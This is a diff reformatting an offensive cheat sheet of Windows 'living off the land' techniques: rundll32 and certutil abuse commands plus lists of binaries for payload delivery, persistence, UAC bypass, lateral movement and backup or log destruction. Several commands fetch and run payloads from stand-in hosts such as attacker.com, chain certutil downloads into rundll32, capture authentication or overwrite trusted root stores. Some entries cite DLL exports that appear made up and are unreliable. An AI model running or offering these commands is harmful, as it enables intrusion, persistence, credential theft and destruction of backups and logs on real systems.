@@ -1,238 +1,268 @@
 
-1. Execute JavaScript/VBScript via MSHTA engine:
+**Rundll32 Execution Techniques Cheat Sheet**
+---
+
+### 🔹 **Rundll32 Payload Execution Methods**
+
+```
+1. JavaScript/VBScript Execution via MSHTA:
    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("wscript.shell.run('calc')")
 
-2. Execute remote HTA (bypass SmartScreen):
+2. Remote HTA Execution (SmartScreen Bypass):
    rundll32.exe url.dll,OpenURL http://attacker.com/payload.hta
 
-3. Invoke shellcode via ShellExecute:
+3. Shellcode Invocation via ShellExecute:
    rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe
 
-4. Open Control Panel item:
+4. Open Control Panel Applet:
    rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl
 
-5. Execute DLL export function:
+5. Execute DLL Export Function:
    rundll32.exe mydll.dll,ExportedFunction
 
-6. Launch Control Panel Internet settings:
+6. Launch Internet Settings:
    rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl
 
-7. Trigger UAC popup via fodhelper (indirect persistence):
+7. UAC Popup via fodhelper:
    reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
    rundll32.exe shell32.dll,Control_RunDLL fodhelper.exe
 
-8. Load library with malicious side-effects:
+8. Load Malicious DLL via Service Dispatcher:
    rundll32.exe advapi32.dll,StartServiceCtrlDispatcherA
 
-9. Network share authentication capture:
+9. Capture Network Share Auth:
    rundll32.exe netshell.dll,StartNetConnectionDialog 127.0.0.1
 
-10. Trigger scheduled task:
+10. Trigger Scheduled Task GUI:
     rundll32.exe taskschd.dll,LaunchAdvancedTask
 
-11. In-memory PowerShell payload:
+11. In-Memory PowerShell via JavaScript:
     rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("new ActiveXObject('WScript.Shell').Run('powershell -nop -w hidden -e <base64>')")
 
-12. Bypass AppLocker via DLL sideloading:
+12. DLL Sideloading (AppLocker Bypass):
     rundll32.exe .\sideload.dll,Main
 
-13. Run with elevated token:
+13. Run Control Panel with Elevated Token:
     rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl
 
-14. Add user silently via backdoor DLL:
+14. Add User via Backdoor DLL:
     rundll32.exe user32.dll,CreateUser
 
-15. Trigger credential UI:
+15. Trigger Credential UI:
     rundll32.exe keymgr.dll,KRShowKeyMgr
 
-16. Load COM object (DLL hijack vector):
+16. COM Object Load (DLL Hijack):
     rundll32.exe comsvcs.dll,MiniDump
 
-17. Trigger biometric prompt (distraction technique):
+17. Trigger Biometric Prompt:
     rundll32.exe biometricPrompt.dll,PromptUser
 
-18. Load and execute VBScript:
+18. Load and Execute VBScript:
     rundll32.exe vbscript.dll,VBScriptMain
 
-19. Call URLDownloadToFile via rundll32:
+19. Download File via URLDownloadToFile:
     rundll32.exe urlmon.dll,URLDownloadToFileA
 
-20. Trigger Group Policy refresh:
+20. Force Group Policy Refresh:
     rundll32.exe gpedit.dll,LaunchGPE
 
-21. Load explorer shell extension (DLL backdoor):
+21. Load Explorer Shell Extension:
     rundll32.exe shell32.dll,SHHelpShortcuts_RunDLL
 
-22. Invoke open/save dialog:
+22. Open/Save Dialog Abuse:
     rundll32.exe comdlg32.dll,ShowOpenSaveDialog
 
-23. Infiltrate via CLSID execution:
+23. CLSID Execution:
     rundll32.exe advpack.dll,LaunchINFSection
 
-24. Trigger CLSID DLL with malicious registry redirection:
+24. Registry-Redirected CLSID Execution:
     rundll32.exe dfshim.dll,ShOpenVerbApplication
 
-25. Use Sxs.dll to run embedded manifest payload:
+25. Embedded Manifest Execution via SXS:
     rundll32.exe sxs.dll,CreateAssemblyCacheItem
 
-26. AutoPlay prompt abuse:
+26. AutoPlay Prompt Execution:
     rundll32.exe shell32.dll,SHInvokePrinterCommand
 
-27. Access network printer dialog (trigger UNC auth):
+27. UNC Path Printer Dialog (Auth Capture):
     rundll32.exe printui.dll,PrintUIEntry
 
-28. Trigger shell popup for lure:
+28. Shell Popup Lure:
     rundll32.exe shell32.dll,SHHelpShortcuts_RunDLL AddPrinter
 
-29. Run IE-specific shell:
+29. Internet Explorer Shell:
     rundll32.exe ieframe.dll,LaunchBrowser
 
-30. Run network setup wizard:
+30. Network Setup Wizard:
     rundll32.exe netplwiz.dll,NetplwizRunDll
 
-31. Load Windows update configuration GUI:
+31. Windows Update Config GUI:
     rundll32.exe wuapi.dll,ShowWindowsUpdate
 
 32. Run Disk Cleanup:
     rundll32.exe cleanmgr.dll,LaunchDiskCleanup
+```
 
+---
 
+### 🔹 **Execution & Payload Delivery Tools**
 
-
-### 🔹 **Execution & Payload Delivery**
-- `mshta.exe` – Execute remote HTA/VBScript payloads.
-- `rundll32.exe` – Run DLLs and JavaScript-based COM objects in memory.
-- `regsvr32.exe` – Execute remote scripts/DLLs using scriptlet loading.
-- `powershell.exe` – Core script execution, fileless payload loading.
-- `msiexec.exe` – Install and execute remote MSI payloads.
-- `cmd.exe` – Generic script/command execution.
-- `wscript.exe` / `cscript.exe` – VBScript/JS-based execution.
-- `certutil.exe` – Download payloads or decode base64-encoded files.
+```
+- mshta.exe        – Remote HTA/VBScript execution
+- rundll32.exe     – Memory execution of DLLs & JS-based COM
+- regsvr32.exe     – Remote script/DLL execution
+- powershell.exe   – Fileless payload & script execution
+- msiexec.exe      – Remote MSI execution
+- cmd.exe          – Generic command execution
+- wscript.exe / cscript.exe – JS/VBS script execution
+- certutil.exe     – Payload download & encoding utilities
+```
 
 ---
 
 ### 🔹 **Persistence & Scheduled Execution**
-- `schtasks.exe` – Create scheduled tasks for persistence.
-- `wmic.exe` – Execute commands and lateral movement via WMI.
-- `eventvwr.exe` – UAC bypass via hijacked registry keys.
-- `fodhelper.exe` – UAC bypass via auto-elevated binary.
 
+```
+- schtasks.exe     – Create persistent scheduled tasks
+- wmic.exe         – Remote & scheduled execution
+- eventvwr.exe     – UAC bypass via registry hijack
+- fodhelper.exe    – Auto-elevated UAC bypass
+```
 
+---
 
 ### 🔹 **Privilege Escalation & Credential Access**
-- `dllhost.exe` – DLL hijacking/COM hijacking.
-- `slui.exe` – Another UAC bypass vector.
-- `sdclt.exe` – Abused for arbitrary command execution and privilege escalation.
-- `taskmgr.exe` – Can load malicious DLLs when hijacked.
 
-### 🔹 **Lateral Movement**
-- `psexec.exe` – Remote command execution (Red Team favorite).
-- `winrm.vbs` – PowerShell Remoting helper.
-- `wmic.exe` – Cross-network process creation via WMI.
+```
+- dllhost.exe      – COM/DLL hijacking
+- slui.exe         – UAC bypass vector
+- sdclt.exe        – Arbitrary code exec with escalation
+- taskmgr.exe      – Malicious DLL injection
+```
+
+---
+
+### 🔹 **Lateral Movement Tools**
+
+```
+- psexec.exe       – Remote command execution
+- winrm.vbs        – PowerShell remoting helper
+- wmic.exe         – Remote process spawning
+```
+
+---
 
 ### 🔹 **Impact – Data Destruction / Anti-Forensics**
-- `cipher.exe` – Securely delete files and wipe disk space.
-- `vssadmin.exe` – Delete volume shadow copies (anti-backup).
-- `wbadmin.exe` – Delete backup catalogs.
-- `bcdedit.exe` – Disable recovery options.
-- `wevtutil.exe` – Clear event logs.
-- `shutdown.exe` – Reboot/shutdown system post-attack.
-- `fsutil.exe` – Manipulate file system behaviors or drive states.
 
+```
+- cipher.exe       – File deletion and disk wipe
+- vssadmin.exe     – Shadow copy deletion
+- wbadmin.exe      – Delete backups
+- bcdedit.exe      – Disable recovery
+- wevtutil.exe     – Clear event logs
+- shutdown.exe     – Reboot system
+- fsutil.exe       – Filesystem manipulation
+```
 
-1. Download file via HTTP:
+---
+
+### 🔹 **Certutil Abuse Techniques**
+
+```
+1. Download via HTTP:
    certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe
 
-2. Encode file to base64:
+2. Encode to Base64:
    certutil -encode payload.exe payload.txt
 
-3. Decode base64 to binary:
+3. Decode from Base64:
    certutil -decode payload.txt payload.exe
 
-4. View certificate store:
+4. View Cert Store:
    certutil -store My
 
-5. Extract public key from cert:
+5. Extract Public Key:
    certutil -store -user My > pubkey.pem
 
-6. Create a dummy cert:
+6. Add Dummy Cert to Root Store:
    certutil -user -addstore Root dummycert.cer
 
-7. Dump certificate revocation list:
+7. Dump CRL:
    certutil -url dummycert.cer
 
-8. Encode script to base64 for PowerShell:
+8. Encode PowerShell Script:
    certutil -encode script.ps1 encoded.txt
 
-9. Create malicious INF file and sign:
+9. Sign INF File:
    certutil -addstore TrustedPublisher malicious.cer
 
-10. Verify signature on payload:
+10. Verify Payload Signature:
     certutil -verify payload.exe
 
-11. Abuse for living-off-the-land download (LOLBAS):
+11. LOLBAS Download:
     certutil -urlcache -split -f http://attacker.com/evil.ps1 evil.ps1
 
-12. Convert cert to Base64 DER format:
+12. Convert Cert to Base64:
     certutil -encode cert.cer cert_base64.txt
 
-13. Convert Base64 cert back to binary:
+13. Convert Base64 to Cert:
     certutil -decode cert_base64.txt cert_decoded.cer
 
-14. Generate random file (for AV evasion):
+14. AV Evasion via Random File:
     certutil -generateSSTFromWU legitfile.sst
 
-15. Download via UNC path (trigger auth):
+15. Download via UNC:
     certutil -urlcache -split -f \\attacker\share\payload.exe payload.exe
 
-16. Validate cert chain (OSINT evasion):
+16. Validate Cert Chain:
     certutil -urlfetch -verify malicious.exe
 
-17. Dump system store:
+17. Dump System Store:
     certutil -user -store -enterprise
 
-18. Harvest certs from other users (if elevated):
+18. Harvest Certs from Users:
     certutil -user -store -pfx
 
-19. Use certutil to ping (time-based exfil):
+19. Ping via Time-Based Exfil:
     certutil -urlcache -f http://attacker.com/`date /t`
 
-20. Sign payload (masquerade legitimacy):
+20. Sign Payload:
     certutil -sign payload.exe signer.cer signed_payload.exe
 
-21. Overwrite trusted store with custom CA:
+21. Overwrite Trusted Root Store:
     certutil -addstore -enterprise -f Root attackerCA.cer
 
-22. Harvest CA trust list:
+22. List CA Trust:
     certutil -viewstore -enterprise CA
 
-23. Enumerate smart card certs:
+23. Enumerate Smart Card Certs:
     certutil -scinfo
 
-24. Force revocation check (side-channel leak):
+24. Side-Channel via Revocation Check:
     certutil -verify -urlfetch malicious.cer
 
-25. Check installed root CAs:
+25. View Root CAs:
     certutil -store root
 
-26. List templates (target cert abuse):
+26. List Templates:
     certutil -template
 
-27. Abuse certutil to rename files:
+27. Rename via Encode/Rename:
     certutil -encode malware.exe newname.txt && ren newname.txt malware.exe
 
-28. Encode PowerShell dropper:
+28. Encode Dropper:
     certutil -encode dropper.ps1 encoded.txt
 
-29. Decode obfuscated payload:
+29. Decode Obfuscated Payload:
     certutil -decode encoded_payload.txt stage2.exe
 
-30. Chain with rundll32 for delivery:
+30. Combine with Rundll32:
     certutil -urlcache -split -f http://evil/payload.dll && rundll32 payload.dll,Entry
 
-31. Auto-persist a dropped cert for UAC bypass:
+31. Persist Cert for UAC Bypass:
     certutil -addstore Root persist.cer
 
-32. Bypass detection with alternate data stream:
+32. Bypass Detection via ADS:
     certutil -urlcache -split -f http://attacker.com/evil.exe C:\temp\legit.exe:evil
+```
 
